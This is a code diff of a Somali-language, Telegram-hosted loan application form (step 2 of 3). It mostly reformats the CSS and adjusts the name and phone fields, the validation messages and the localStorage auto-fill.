@@ -5,27 +5,155 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Codsiga Amaahda - Step 2</title>
 
+    <!-- Telegram WebApp SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
-        body { font-family: -apple-system, sans-serif; background-color: #f8f9fa; margin: 0; display: flex; flex-direction: column; align-items: center; }
-        .nav-header { width: 100%; background: linear-gradient(90deg, #a4e433 0%, #4caf50 100%); padding: 15px 20px; color: white; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; }
-        .waafi-logo { font-size: 24px; font-weight: bold; }
-        .form-card { background: white; width: 92%; max-width: 480px; margin-top: 25px; padding: 30px 20px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); box-sizing: border-box; }
-        h2 { text-align: center; margin: 0; font-size: 26px; }
-        .step-info { text-align: center; font-size: 15px; color: #888; margin: 10px 0 25px; }
-        .progress-box { display: flex; gap: 8px; margin-bottom: 35px; }
-        .bar { height: 4px; flex: 1; background: #e0e0e0; border-radius: 2px; }
-        .active-bar { background: #82d13d; }
-        .input-wrap { margin-bottom: 22px; }
-        label { display: block; font-size: 16px; font-weight: 500; margin-bottom: 10px; }
-        input { width: 100%; padding: 15px; border: 1px solid #d1d1d1; border-radius: 8px; font-size: 17px; box-sizing: border-box; }
-        .phone-container { display: flex; gap: 10px; }
-        .country-code { width: 80px; background: #f9f9f9; text-align: center; font-weight: bold; border: 1px solid #d1d1d1; line-height: 48px; }
-        .btn-container { display: flex; flex-direction: column; gap: 15px; margin-top: 30px; }
-        .back-btn { background-color: #f1f1f1; color: #777; border: 1px solid #ddd; padding: 16px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
-        .next-btn { background: linear-gradient(90deg, #a4e433 0%, #7dbd27 100%); color: white; border: none; padding: 18px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        .footer-text { text-align: center; font-size: 13px; color: #aaa; margin: 40px 0 30px; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f7f7f7;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .nav-header {
+            width: 100%;
+            background: linear-gradient(90deg, #a4e433 0%, #4caf50 100%);
+            padding: 15px 20px;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-sizing: border-box;
+        }
+
+        .waafi-logo {
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .form-card {
+            background: white;
+            width: 92%;
+            max-width: 480px;
+            margin-top: 25px;
+            padding: 30px 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+            box-sizing: border-box;
+        }
+
+        .progress-box {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 35px;
+        }
+
+        .bar {
+            height: 4px;
+            flex: 1;
+            background: #e0e0e0;
+            border-radius: 2px;
+        }
+
+        .active-bar {
+            background: #82d13d;
+        }
+
+        .input-wrap {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            font-size: 17px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            color: #333;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #d1d1d1;
+            border-radius: 10px;
+            font-size: 17px;
+            box-sizing: border-box;
+            background-color: #fafafa;
+            color: #333;
+        }
+
+        input::placeholder {
+            color: #aaa;
+        }
+
+        .phone-container {
+            display: flex;
+            gap: 10px;
+        }
+
+        .country-code {
+            width: 85px;
+            background: #eee;
+            text-align: center;
+            font-weight: bold;
+            border: 1px solid #d1d1d1;
+            line-height: 52px;
+            color: #000;
+            border-radius: 10px;
+        }
+
+        .phone-input {
+            flex: 1;
+        }
+
+        .phone-hint {
+            font-size: 13px;
+            color: #888;
+            margin-top: 10px;
+        }
+
+        .btn-container {
+            margin-top: 40px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .back-btn {
+            background-color: #b0b0b0;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 18px;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .next-btn {
+            background-color: #2e7d32;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 18px;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .footer-text {
+            text-align: center;
+            font-size: 13px;
+            color: #aaa;
+            margin: 40px 0 30px;
+        }
     </style>
 </head>
 
@@ -38,9 +166,6 @@
 </div>
 
 <div class="form-card">
-    <h2>Codsiga Amaahda</h2>
-    <p class="step-info">Tallaabada 2 ee 3</p>
-
     <div class="progress-box">
         <div class="bar active-bar"></div>
         <div class="bar active-bar"></div>
@@ -49,26 +174,26 @@
 
     <div class="input-wrap">
         <label>Magaca Hore</label>
-        <input type="text" id="firstName" placeholder="Tusaale: Ahmed">
+        <input type="text" id="firstName" placeholder="Ahmed">
     </div>
 
     <div class="input-wrap">
         <label>Magaca Dambe</label>
-        <input type="text" id="lastName" placeholder="Tusaale: Hassan">
+        <input type="text" id="lastName" placeholder="Hassan">
     </div>
 
     <div class="input-wrap">
         <label>Lambarka Taleefanka</label>
         <div class="phone-container">
-            <input type="text" class="country-code" value="+252" readonly>
-            <input type="tel" id="phone" placeholder="612345678" maxlength="9">
+            <div class="country-code">+252</div>
+            <input type="tel" id="phone" class="phone-input" placeholder="612345678" maxlength="9">
         </div>
-        <p style="font-size: 12px; color: #888; margin-top: 5px;">Tusaale: 61xxxxxxx ama 77xxxxxxx</p>
+        <p class="phone-hint">Geli 9 tiro (tusaale: 612345678 ama 907654321)</p>
     </div>
 
     <div class="btn-container">
-        <button class="back-btn" onclick="goBack()">KA HORE</button>
-        <button class="next-btn" onclick="goNext()">TALLAABADA XIGTA</button>
+        <button type="button" class="back-btn" onclick="goBack()">KA HORE</button>
+        <button type="button" class="next-btn" onclick="goNext()">TALLAABADA XIGTA</button>
     </div>
 </div>
 
@@ -76,24 +201,17 @@
 
 <script>
     function goNext() {
-        const fEl = document.getElementById('firstName');
-        const lEl = document.getElementById('lastName');
-        const pEl = document.getElementById('phone');
-
-        if (!fEl || !lEl || !pEl) return;
-
-        const fName = fEl.value.trim();
-        const lName = lEl.value.trim();
-        const phone = pEl.value.trim();
+        const fName = document.getElementById('firstName').value.trim();
+        const lName = document.getElementById('lastName').value.trim();
+        const phone = document.getElementById('phone').value.trim();
 
         if (!fName || !lName || !phone) {
-            alert("Fadlan buuxi dhammaan meelaha!");
+            alert("Fadlan buuxi dhammaan meelaha banaan.");
             return;
         }
 
-        // Only digits check
         if (!/^\d{9}$/.test(phone)) {
-            alert("Geli number sax ah (9 digits oo keliya).");
+            alert("Geli number sax ah oo 9 tiro ah.");
             return;
         }
 
@@ -110,12 +228,12 @@
 
     window.onload = () => {
         const tg = window.Telegram?.WebApp;
-
         if (tg) {
-            tg.ready();
+            tg.ready();   // ✅ important
             tg.expand();
         }
 
+        // Auto-fill existing data
         const f = localStorage.getItem('firstName');
         const l = localStorage.getItem('lastName');
         const p = localStorage.getItem('phone');
